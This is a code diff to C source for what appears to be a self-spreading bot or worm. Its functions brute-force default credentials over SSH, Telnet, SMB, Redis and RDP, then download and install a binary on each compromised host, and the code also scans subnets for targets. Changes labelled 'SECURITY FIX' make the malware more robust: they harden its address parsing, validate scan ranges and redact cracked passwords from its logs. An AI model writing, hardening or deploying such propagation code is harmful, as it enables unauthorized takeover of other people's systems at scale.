@@ -62,16 +62,14 @@ static int create_connection(const char *ip, uint16_t port, int timeout_ms) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     
-    struct hostent *he = gethostbyname(ip);
-    if (he) {
-        memcpy(&addr.sin_addr, he->h_addr, he->h_length);
-    } else {
+    /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
+     * gethostbyname + memcpy (h_length can be 16 for IPv6, overflowing). */
+    if (inet_pton(AF_INET, ip, &addr.sin_addr) != 1) {
         addr.sin_addr.s_addr = inet_addr(ip);
-    }
-    
-    if (addr.sin_addr.s_addr == INADDR_NONE) {
-        close(sock);
-        return -1;
+        if (addr.sin_addr.s_addr == INADDR_NONE) {
+            close(sock);
+            return -1;
+        }
     }
     
     int ret = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
@@ -184,7 +182,7 @@ int spread_ssh(notnet_bot_t *bot, const char *ip, uint16_t port) {
         for (int p = 0; default_passes[p]; p++) {
             if (try_login_ssh(ip, port, default_users[u], default_passes[p])) {
                 log_info("SSH: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], default_passes[p]);
+                         ip, port, default_users[u], "***REDACTED***");
                 
                 /* Download and install binary */
                 char cmd[512];
@@ -269,7 +267,7 @@ int spread_telnet(notnet_bot_t *bot, const char *ip, uint16_t port) {
         for (int p = 0; default_passes[p]; p++) {
             if (try_login_telnet(ip, port, default_users[u], default_passes[p])) {
                 log_info("Telnet: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], default_passes[p]);
+                         ip, port, default_users[u], "***REDACTED***");
                 
                 char cmd[512];
                 snprintf(cmd, sizeof(cmd),
@@ -314,7 +312,7 @@ int spread_smb(notnet_bot_t *bot, const char *ip, uint16_t port) {
         for (int p = 0; default_passes[p]; p++) {
             if (try_login_smb(ip, port, default_users[u], default_passes[p])) {
                 log_info("SMB: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], default_passes[p]);
+                         ip, port, default_users[u], "***REDACTED***");
                 
                 char cmd[512];
                 snprintf(cmd, sizeof(cmd),
@@ -416,7 +414,7 @@ int spread_redis(notnet_bot_t *bot, const char *ip, uint16_t port) {
             /* AUTH returns +OK on success */
             if (strstr(auth_resp, "+OK")) {
                 log_info("Redis: auth success %s:%d with %s:%s",
-                         ip, port, default_users[u], default_passes[p]);
+                         ip, port, default_users[u], "***REDACTED***");
                 
                 /* Send PING to verify */
                 send(sock, "PING\r\n", 6, 0);
@@ -476,7 +474,7 @@ int spread_rdp(notnet_bot_t *bot, const char *ip, uint16_t port) {
         for (int p = 0; default_passes[p]; p++) {
             if (try_login_rdp(ip, port, default_users[u], default_passes[p])) {
                 log_info("RDP: cracked %s:%d with %s:%s",
-                         ip, port, default_users[u], default_passes[p]);
+                         ip, port, default_users[u], "***REDACTED***");
                 
                 char cmd[512];
                 snprintf(cmd, sizeof(cmd),
@@ -498,18 +496,32 @@ int scan_subnet(notnet_bot_t *bot, const char *subnet, uint8_t service_mask) {
     sscanf(subnet, "%15[^/]/%3s", net, mask);
     
     int prefix = atoi(mask);
-    uint32_t net_ip = inet_addr(net);
-    if (net_ip == INADDR_NONE) {
-        log_error("scan_subnet: invalid IP %s", net);
+    /* SECURITY FIX (#4): Validate prefix range to prevent integer overflow
+     * in (1 << (32 - prefix)). Also reject prefixes smaller than /16 to
+     * avoid scanning millions of IPs. */
+    if (prefix < 16 || prefix > 32) {
+        log_error("scan_subnet: invalid prefix %d (must be 16-32)", prefix);
         return -1;
     }
     
+    /* SECURITY FIX (#4): Use inet_pton instead of inet_addr (deprecated,
+     * inet_addr returns INADDR_NONE for both error and 255.255.255.255). */
+    struct in_addr in;
+    if (inet_pton(AF_INET, net, &in) != 1) {
+        log_error("scan_subnet: invalid IP %s", net);
+        return -1;
+    }
+    uint32_t net_ip = in.s_addr;  /* already in network byte order */
+    
     uint32_t host_ip = ntohl(net_ip);
+    /* With prefix clamped to [16,32], (1<<(32-prefix)) is at most 1<<16 = 65536 */
     int hosts = (1 << (32 - prefix)) - 2; /* exclude network and broadcast */
-    if (hosts > 254) hosts = 254; /* default limit to /24 */
+    /* Hard cap at 254 even for /16+ to prevent runaway scanning */
+    if (hosts > 254) hosts = 254;
     if (bot->scan_max_hosts > 0 && bot->scan_max_hosts < (uint32_t)hosts) {
         hosts = (int)bot->scan_max_hosts;
     }
+    if (hosts < 1) hosts = 1;  /* guarantee at least one iteration */
     
     /* Use config timeout, fall back to compile-time default */
     int timeout = SCAN_TIMEOUT_MS;
